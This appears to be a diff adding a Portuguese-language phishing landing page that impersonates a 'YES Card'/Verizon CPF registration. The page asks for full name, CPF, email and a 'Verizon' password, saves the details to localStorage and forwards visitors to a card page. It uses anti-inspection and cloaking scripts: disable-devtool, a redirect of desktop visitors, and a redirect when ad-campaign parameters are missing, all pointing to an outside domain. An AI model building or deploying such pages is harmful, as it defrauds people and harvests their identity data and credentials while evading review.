@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+    url="https://appavaliadorpremios.shop/lp/"></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+    }
+</script>
+  <script type="text/javascript">
+    (function () {
+        /**
+         * Função para verificar a presença de múltiplos parâmetros na URL
+         * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+         * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+         */
+        function hasAllURLParameters(names) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return names.every(param => urlParams.has(param));
+        }
+
+        // Array contendo os parâmetros obrigatórios
+        const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+        // URL para redirecionamento caso algum dos parâmetros não esteja presente
+        const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+        /**
+         * Função principal que verifica os parâmetros da URL
+         * e redireciona o usuário se necessário
+         */
+        function checkURLParameters() {
+            if (!hasAllURLParameters(requiredParams)) {
+                window.location.href = redirectURL;
+            }
+        }
+
+        // Executa a verificação imediatamente assim que o script é carregado
+        checkURLParameters();
+    })();
+</script>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consulta de CPF</title>
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <link href="css2.html" rel="stylesheet">
+
+
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .header {
+      background-color: #ffffff;
+      padding: 20px;
+      text-align: center;
+      background: linear-gradient(147deg, #ffe53b 0%, #ff2525 74%);
+    }
+
+    .header img {
+      width: 150px;
+    }
+
+    .main-content {
+      max-width: 500px;
+      background: #fff;
+      margin: 50px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .btn-custom {
+      color: rgb(255, 255, 255);
+      border: none;
+      width: 100%;
+      margin-bottom: 10px;
+      background: #ff2525;
+      font-weight: 600;
+      border-radius: 1rem;
+      padding: 0.75rem 3rem;
+      letter-spacing: 0.3px;
+      line-height: 1.15;
+    }
+
+    .btn-custom:hover {
+      color: white !important;
+      background-color: #000 !important;
+      transform: scale(1.02) !important;
+    }
+
+    .footer {
+      background: #ffffff;
+      border-top: 1px solid #e6e6e6;
+      text-align: center;
+      padding: 15px;
+      font-size: 10px;
+      color: #666;
+      margin-top: auto;
+    }
+
+    .result-box {
+      margin-top: 20px;
+      background-color: #f9f9f9;
+      border: 1px solid #e6e6e6;
+      border-radius: 8px;
+      padding: 15px;
+      display: none;
+      text-align: left;
+    }
+
+    .result-box p {
+      margin: 0 0 10px;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .loader img {
+      width: 50px;
+      height: 50px;
+    }
+
+    .success-message {
+      text-align: center;
+      font-weight: bold;
+      color: green;
+      margin-bottom: 15px;
+    }
+
+    .success-message img {
+      width: 50px;
+      height: 50px;
+      display: block;
+      margin: 0 auto 10px;
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-NGSPZL3X93"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-NGSPZL3X93');
+  </script>
+
+
+</head>
+
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <img src="images/logo.png" alt="YES Card">
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content">
+    <p style="color: gray; text-align: initial">
+      Preencha o seus dados para cadastro
+    </p>
+    <form id="cadastroForm" style="text-align: initial" action="">
+      <div class="mb-3">
+        <label for="name" class="form-label" style="color: gray; font-size: 13px">Nome Completo</label>
+        <input type="text" class="form-control" id="name" style="border: 1px solid #e6e6e6; border-radius: 10px">
+      </div>
+      <div class="mb-3">
+        <label for="cpf" class="form-label" style="color: gray; font-size: 13px">CPF</label>
+        <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00"
+          style="border: 1px solid #e6e6e6; border-radius: 10px">
+      </div>
+      <div class="mb-3">
+        <label for="email" class="form-label" style="color: gray; font-size: 13px">E-mail</label>
+        <input type="text" class="form-control" id="email" style="border: 1px solid #e6e6e6; border-radius: 10px">
+      </div>
+      <div class="mb-3">
+        <label for="password" class="form-label" style="color: gray; font-size: 13px">Crie sua senha Verizon</label>
+        <input type="password" class="form-control" id="password"
+          style="border: 1px solid #e6e6e6; border-radius: 10px">
+      </div>
+
+      <div class="mb-3">
+        <label for="confirmPassword" class="form-label" style="color: gray; font-size: 13px">Confirme sua senha
+          Verizon</label>
+        <input type="password" class="form-control" id="confirmPassword"
+          style="border: 1px solid #e6e6e6; border-radius: 10px">
+        <small id="passwordError" style="color: red; display: none;margin-top: 10px;">As senhas não coincidem.</small>
+      </div>
+
+      <input type="hidden" name="utm_source" value="organic"><input type="hidden" name="utm_campaign" value=""><input
+        type="hidden" name="utm_medium" value=""><input type="hidden" name="utm_content" value=""><input type="hidden"
+        name="utm_term" value=""><input type="hidden" name="xcod" value=""><input type="hidden" name="sck" value="">
+    </form>
+    <button id="consultarBtn" class="btn-custom" onclick="submitLog()" disabled="">
+      Consultar CPF
+    </button>
+    <div id="loader" class="loader">
+      <img src="21-18-05-265_512.html" alt="Carregando...">
+      <p>Consultando seus dados...</p>
+    </div>
+
+    <!-- Resultado -->
+    <div id="resultBox" class="result-box">
+      <div class="success-message">
+        <p>Dados cadastrados com sucesso!</p>
+      </div>
+      <p>
+        Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong>
+      </p>
+      <p>
+        <!-- <strong>Data de Nascimento:</strong> <span id="dataNascimento"></span> -->
+      </p>
+      <!-- <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p> -->
+      <!-- <p><strong>Sexo:</strong> <span id="sexo"></span></p> -->
+
+      <p><strong>E-mail:</strong> <span id="emailCompleto"></span></p>
+
+      <p><strong>CPF:</strong> <span id="cpfcompleto"></span></p>
+
+      <button class="btn-custom" onclick="PassarUTMS()" id="0bb9305d-3bc0-6469-3942-3e561d76cfcb">Continuar</button>
+
+    </div>
+  </div>
+
+  <!-- Script -->
+  <script>
+    function validaCPF(strCPF) {
+      let Soma = 0;
+      let Resto;
+      if (strCPF == "00000000000") return false;
+
+      for (let i = 1; i <= 9; i++)
+        Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
+      Resto = (Soma * 10) % 11;
+
+      if (Resto == 10 || Resto == 11) Resto = 0;
+      if (Resto != parseInt(strCPF.substring(9, 10))) return false;
+
+      Soma = 0;
+      for (let i = 1; i <= 10; i++)
+        Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
+      Resto = (Soma * 10) % 11;
+
+      if (Resto == 10 || Resto == 11) Resto = 0;
+      if (Resto != parseInt(strCPF.substring(10, 11))) return false;
+      return true;
+    }
+
+    function validateForm() {
+      const name = document.getElementById("name").value;
+      const cpf = document.getElementById("cpf").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const confirmPassword = document.getElementById("confirmPassword").value;
+      const passwordError = document.getElementById("passwordError");
+      const consultarBtn = document.getElementById("consultarBtn");
+
+      if (name && cpf && email && password && confirmPassword) {
+        if (password === confirmPassword) {
+          passwordError.style.display = "none";
+          consultarBtn.disabled = false;
+        } else {
+          passwordError.style.display = "block";
+          consultarBtn.disabled = true;
+        }
+      } else {
+        consultarBtn.disabled = true;
+      }
+    }
+
+    document.getElementById("name").addEventListener("input", validateForm);
+    document.getElementById("cpf").addEventListener("input", validateForm);
+    document.getElementById("email").addEventListener("input", validateForm);
+    document.getElementById("password").addEventListener("input", validateForm);
+    document.getElementById("confirmPassword").addEventListener("input", validateForm);
+
+    async function submitLog() {
+      const cpf = document
+        .getElementById("cpf")
+        .value.replace(/-/g, "")
+        .replace(/\./g, "");
+      const loader = document.getElementById("loader");
+      const resultBox = document.getElementById("resultBox");
+      const consultarBtn = document.getElementById("consultarBtn");
+      const email = document.getElementById("email").value;
+
+      if (!validaCPF(cpf)) {
+        alert("CPF inválido!");
+        return;
+      }
+
+      loader.style.display = "block";
+      consultarBtn.style.display = "none";
+      resultBox.style.display = "none";
+
+      const nomeCompleto = document.getElementById("name").value;
+      document.getElementById("nomeCompleto").innerText = nomeCompleto;
+      document.getElementById("emailCompleto").innerText = email;
+      document.getElementById("cpfcompleto").innerText = cpf;
+
+      localStorage.setItem(
+        "dadosCPF",
+        JSON.stringify({
+          nomeCompleto,
+          cpf,
+          email,
+        })
+      );
+
+      loader.style.display = "none";
+      resultBox.style.display = "block";
+    }
+
+    function PassarUTMS() {
+
+      const queryString = window.location.search;
+      window.location.href = "card.html" + queryString;
+    }
+  </script>
+
+  <!-- Footer -->
+  <div class="footer">
+    Copyright © 2025 Verizon. Todos os direitos reservados.<br>
+
+    Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa
+    do Site
+  </div>
+
+  <script>
+    window.pixelId = "66b3a64f335ef199b3e5b257";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body>
+
+</html>
